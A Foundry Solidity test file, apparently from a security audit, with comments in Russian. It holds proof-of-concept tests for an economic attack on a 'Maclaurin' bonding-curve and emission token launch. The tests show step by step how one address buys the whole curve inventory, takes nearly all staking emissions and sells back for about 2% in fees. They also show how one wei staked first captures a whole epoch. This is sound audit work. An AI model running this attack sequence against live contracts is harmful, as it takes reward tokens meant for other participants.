// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {MaclaurinEmission} from "../src/MaclaurinEmission.sol";
import {MaclaurinToken} from "../src/MaclaurinToken.sol";
import {MaclaurinCurve} from "../src/MaclaurinCurve.sol";

/**
 * @title  LaunchWindowPoC
 * @notice PoC экономической атаки на связку «кривая + эмиссия».
 *
 *         Это НЕ баг в коде — все инварианты контрактов выполняются. Это
 *         следствие двух параметров, выбранных независимо друг от друга:
 *
 *           - весь инвентарь кривой (1e27 = 1 млрд токенов) стоит 3.72 ETH;
 *           - награда эмиссии делится пропорционально весу стейка.
 *
 *         Отсюда: тот, кто выкупил инвентарь, получает и почти всю эмиссию,
 *         а потом продаёт инвентарь обратно кривой по той же средней цене —
 *         он единственный держатель, поэтому цена возвращается в исходную
 *         точку. Чистая стоимость атаки — только комиссия 2 × 1%.
 *
 *         Воспроизводит состояние мейннета на момент аудита: окно анти-снайпа
 *         кривой истекло, `sold == 0`, эмиссия ещё не стартовала.
 */
contract LaunchWindowPoC is Test {
    MaclaurinEmission emission;
    MaclaurinToken token;
    MaclaurinCurve curve;

    address genesis = makeAddr("genesis");
    address vault = makeAddr("remainderVault");
    address feeRecipient = makeAddr("feeRecipient");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.warp(1_785_764_619); // момент развёртывания в мейннете

        // Эмиссия стартует через ~17 часов после развёртывания кривой —
        // ровно как в мейннете (startTime 1785850780, кривая 1785764619).
        emission = new MaclaurinEmission(genesis, vault, block.timestamp + 86_161);
        token = emission.token();

        curve = new MaclaurinCurve(IERC20(address(token)), feeRecipient);

        // INVENTORY() читается ДО prank: внешний вызов в аргументе съел бы его.
        uint256 inventory = curve.INVENTORY();
        vm.prank(genesis);
        token.transfer(address(curve), inventory);
    }

    function test_PoC_OneAddressBuysInventoryAndTakesTheWholeEmission() public {
        // ── 1. Окно анти-снайпа уже истекло, ограничений на покупку нет ──────
        vm.warp(curve.antiSnipeEnd() + 1);
        assertEq(curve.sold(), 0, "mainnet: nothing bought yet");

        uint256 price = curve.maxEthIn();
        vm.deal(attacker, price);

        vm.prank(attacker);
        uint256 bought = curve.buy{value: price}(1, block.timestamp + 1);

        assertEq(bought, curve.INVENTORY(), "one tx takes the whole inventory");
        console2.log("1. buy: paid wei          ", price);
        console2.log("   got tokens             ", bought / 1e18);

        // ── 2. Стейк всего инвентаря с максимальным радиусом ─────────────────
        vm.warp(emission.startTime());
        vm.startPrank(attacker);
        token.approve(address(emission), bought);
        emission.stake(bought, emission.MAX_RADIUS());
        vm.stopPrank();

        // ── 3. Досидеть до конца эмиссии и забрать награду ───────────────────
        vm.warp(emission.emissionEnd() + 1);
        vm.prank(attacker);
        emission.claim();

        uint256 farmed = token.balanceOf(attacker);
        console2.log("2. farmed emission tokens ", farmed / 1e18);
        console2.log("   of emittable total     ", emission.totalEmittable() / 1e18);

        // Один стейкер получает ВСЮ эмиссию: делитель totalWeight — это его вес.
        assertGt(farmed, (emission.totalEmittable() * 999) / 1000, "took >99.9% of the emission pool");

        // ── 4. Вернуть инвентарь кривой и получить ETH обратно ───────────────
        vm.startPrank(attacker);
        emission.unstake(bought);
        token.approve(address(curve), bought);
        uint256 back = curve.sell(bought, 1, block.timestamp + 1);
        vm.stopPrank();

        console2.log("3. sell: got wei back     ", back);
        console2.log("   net ETH cost (wei)     ", price - back);
        console2.log("   tokens kept            ", token.balanceOf(attacker) / 1e18);

        // Цена вернулась в исходную точку: атакующий был единственным держателем.
        assertEq(curve.sold(), 0, "curve is empty again");

        // Итог: 718 млн токенов (26.4% сапплая) за 2% комиссии от 3.72 ETH.
        uint256 netCost = price - back;
        assertLt(netCost, 0.08 ether, "net cost below 0.08 ETH");
        assertGt(token.balanceOf(attacker), 700_000_000e18, "attacker keeps the whole emission");
    }

    /**
     * @notice Обратная сторона того же механизма: РАЗМЕР стейка не важен, пока
     *         стейкер один. Награда считается как weight × (Δrpt)/ACC, а Δrpt
     *         равна scaled/totalWeight — если totalWeight и есть твой вес, оба
     *         множителя сокращаются. Один wei токена, застейканный первым,
     *         забирает 100% эмиссии за всё время, пока он единственный.
     */
    function test_PoC_OneWeiStakedFirstTakesEverything() public {
        vm.prank(genesis);
        token.transfer(attacker, 1); // один wei — этого достаточно

        vm.warp(emission.startTime());
        vm.startPrank(attacker);
        token.approve(address(emission), 1);
        emission.stake(1, 1); // радиус 1: лок всего 7 дней
        vm.stopPrank();

        // Неделя в одиночестве = вся награда эпохи 2.
        vm.warp(emission.startTime() + 7 days);
        uint256 earned = emission.earned(attacker);

        console2.log("staked (wei)              ", uint256(1));
        console2.log("earned after 1 empty epoch", earned / 1e18);
        console2.log("epoch 2 amount            ", emission.epochAmount(2) / 1e18);

        assertEq(earned, emission.epochAmount(2), "1 wei alone takes the whole epoch");
        assertEq(emission.pendingUnallocated(), 0, "nothing leaks to the vault");
    }

    /// @notice Побочное следствие: пока ни одного стейкера нет, эмиссия
    ///         утекает в казну остаточного члена — 826 токенов в секунду.
    function test_PoC_EmissionLeaksToVaultWhileNobodyStakes() public {
        vm.warp(emission.startTime() + 1 days);
        assertEq(emission.pendingUnallocated(), emission.epochAmount(2) / 7);

        console2.log("tokens lost per day of empty stake", emission.pendingUnallocated() / 1e18);

        vm.warp(emission.startTime() + 7 days);
        console2.log("tokens lost per empty epoch 2    ", emission.pendingUnallocated() / 1e18);
    }
}
